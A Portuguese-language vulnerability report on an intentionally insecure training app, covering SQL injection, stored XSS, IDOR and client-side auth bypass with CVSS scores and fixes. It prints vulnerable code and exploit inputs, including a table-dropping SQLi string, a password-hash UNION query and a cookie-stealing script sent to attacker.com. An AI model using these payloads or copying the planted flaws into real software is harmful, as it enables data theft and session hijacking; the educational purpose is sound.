# Relatório de Vulnerabilidades - PokéCards App

## Resumo Executivo

Este documento identifica e classifica 4 vulnerabilidades de segurança intencionalmente implementadas na aplicação PokéCards para fins educacionais e de teste de penetração.

---

## 1. SQL Injection (SQLi)

### Descrição
A funcionalidade de busca de cartas é vulnerável a ataques de SQL Injection devido à concatenação direta de entrada do usuário na query SQL.

### Localização
- **Arquivo**: `app/page.tsx`
- **Função**: `searchCards()`
- **Linha**: Query SQL construída dinamicamente

### Código Vulnerável
\`\`\`javascript
const query = `SELECT * FROM cards WHERE name LIKE '%${searchQuery}%'`
\`\`\`

### Como Explorar
1. Acesse a aba "Buscar" na aplicação
2. No campo de busca, insira: `'; DROP TABLE cards; --`
3. Ou para extração de dados: `' UNION SELECT id,username,email,password_hash,coins,avatar,created_at,updated_at FROM users --`

### Impacto
- Acesso não autorizado a dados sensíveis
- Modificação ou exclusão de dados
- Possível escalação de privilégios

### Classificação CVSS 3.1
**Vetor**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

**Pontuação**: 10.0 (CRÍTICA)

**Justificativa**:
- AV:N - Vetor de ataque via rede
- AC:L - Baixa complexidade de ataque
- PR:N - Nenhum privilégio necessário
- UI:N - Nenhuma interação do usuário
- S:C - Escopo alterado (pode afetar outros componentes)
- C:H - Alto impacto na confidencialidade
- I:H - Alto impacto na integridade
- A:H - Alto impacto na disponibilidade

---

## 2. Cross-Site Scripting (XSS) Armazenado

### Descrição
O campo de mensagem nas propostas de troca permite a inserção de código JavaScript malicioso que é executado quando outros usuários visualizam a proposta.

### Localização
- **Arquivo**: `app/page.tsx`
- **Componente**: Exibição de mensagens de troca
- **Linha**: `dangerouslySetInnerHTML={{ __html: offer.message }}`

### Código Vulnerável
\`\`\`javascript
<p className="text-sm" dangerouslySetInnerHTML={{ __html: offer.message }}></p>
\`\`\`

### Como Explorar
1. Acesse a aba "Trocas"
2. No campo "Mensagem da troca", insira: `<script>alert('XSS Attack!');</script>`
3. Ou para roubo de cookies: `<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>`
4. Crie uma proposta de troca
5. O script será executado quando qualquer usuário visualizar a proposta

### Impacto
- Roubo de sessões e cookies
- Redirecionamento malicioso
- Execução de ações em nome do usuário
- Desfiguração da interface

### Classificação CVSS 3.1
**Vetor**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

**Pontuação**: 5.4 (MÉDIA)

**Justificativa**:
- AV:N - Vetor de ataque via rede
- AC:L - Baixa complexidade de ataque
- PR:L - Privilégios baixos necessários (usuário logado)
- UI:R - Requer interação do usuário (visualizar proposta)
- S:C - Escopo alterado (afeta outros usuários)
- C:L - Baixo impacto na confidencialidade
- I:L - Baixo impacto na integridade
- A:N - Nenhum impacto na disponibilidade

---

## 3. Insecure Direct Object Reference (IDOR)

### Descrição
A funcionalidade de visualização de coleções de outros usuários permite acesso direto a dados através de IDs sequenciais sem validação de autorização adequada.

### Localização
- **Arquivo**: `app/page.tsx`
- **Função**: `viewUserCollection()`
- **Componente**: Campo "Ver coleção do usuário (ID)"

### Código Vulnerável
\`\`\`javascript
const viewUserCollection = () => {
    if (!viewingUserId) return
    
    const userId = parseInt(viewingUserId)
    // Sem validação de autorização
    if (userId === 1) {
        setOtherUserCards(userCards)
    } else {
        setOtherUserCards([mockCards[2], mockCards[3], mockCards[4]])
    }
}
\`\`\`

### Como Explorar
1. Acesse a aba "Trocas"
2. No campo "Ver coleção do usuário (ID)", teste diferentes IDs: 1, 2, 3, 4, etc.
3. Observe que é possível acessar coleções de qualquer usuário sem autorização
4. Em uma implementação real, isso permitiria acesso a dados sensíveis de outros usuários

### Impacto
- Acesso não autorizado a dados de outros usuários
- Violação de privacidade
- Possível enumeração de usuários
- Exposição de informações sensíveis

### Classificação CVSS 3.1
**Vetor**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

**Pontuação**: 6.5 (MÉDIA)

**Justificativa**:
- AV:N - Vetor de ataque via rede
- AC:L - Baixa complexidade de ataque
- PR:L - Privilégios baixos necessários (usuário logado)
- UI:N - Nenhuma interação adicional do usuário
- S:U - Escopo inalterado
- C:H - Alto impacto na confidencialidade
- I:N - Nenhum impacto na integridade
- A:N - Nenhum impacto na disponibilidade

---

## 4. Authentication Bypass / Session Management

### Descrição
A aplicação não implementa validação adequada de sessão, permitindo que usuários não autenticados acessem funcionalidades restritas através de manipulação do estado da aplicação.

### Localização
- **Arquivo**: `app/page.tsx`
- **Estado**: `currentUser` definido estaticamente
- **Problema**: Ausência de validação de sessão server-side

### Código Vulnerável
\`\`\`javascript
const [currentUser, setCurrentUser] = useState<User>({ 
    id: 1, 
    username: 'Trainer123', 
    coins: 500, 
    avatar: '/placeholder.svg?height=40&width=40' 
})
\`\`\`

### Como Explorar
1. Abra as ferramentas de desenvolvedor do navegador
2. No console, execute: `localStorage.setItem('userCoins', '999999')`
3. Ou manipule o estado diretamente através do React DevTools
4. Modifique valores como moedas, ID do usuário, etc.
5. A aplicação aceita essas modificações sem validação server-side

### Impacto
- Bypass completo de autenticação
- Manipulação de dados financeiros (moedas)
- Acesso a funcionalidades administrativas
- Escalação de privilégios

### Classificação CVSS 3.1
**Vetor**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L`

**Pontuação**: 9.4 (CRÍTICA)

**Justificativa**:
- AV:N - Vetor de ataque via rede
- AC:L - Baixa complexidade de ataque
- PR:N - Nenhum privilégio necessário
- UI:N - Nenhuma interação do usuário
- S:C - Escopo alterado (pode afetar todo o sistema)
- C:H - Alto impacto na confidencialidade
- I:H - Alto impacto na integridade
- A:L - Baixo impacto na disponibilidade

---

## Resumo das Classificações

| Vulnerabilidade | CVSS Score | Severidade | Prioridade de Correção |
|----------------|------------|------------|----------------------|
| SQL Injection | 10.0 | CRÍTICA | 1 |
| Authentication Bypass | 9.4 | CRÍTICA | 2 |
| IDOR | 6.5 | MÉDIA | 3 |
| XSS Armazenado | 5.4 | MÉDIA | 4 |

## Recomendações de Correção

### Para SQL Injection:
- Implementar prepared statements ou queries parametrizadas
- Validar e sanitizar todas as entradas do usuário
- Usar ORMs que oferecem proteção contra SQLi

### Para XSS:
- Sanitizar todas as entradas do usuário
- Usar bibliotecas como DOMPurify
- Implementar Content Security Policy (CSP)
- Evitar `dangerouslySetInnerHTML`

### Para IDOR:
- Implementar controle de acesso baseado em sessão
- Validar autorização para cada recurso acessado
- Usar identificadores não sequenciais (UUIDs)

### Para Authentication Bypass:
- Implementar autenticação server-side robusta
- Usar tokens JWT ou sessões seguras
- Validar todas as operações no backend
- Implementar middleware de autenticação

---

**Nota**: Estas vulnerabilidades foram implementadas intencionalmente para fins educacionais. Em um ambiente de produção, todas devem ser corrigidas antes do deploy.
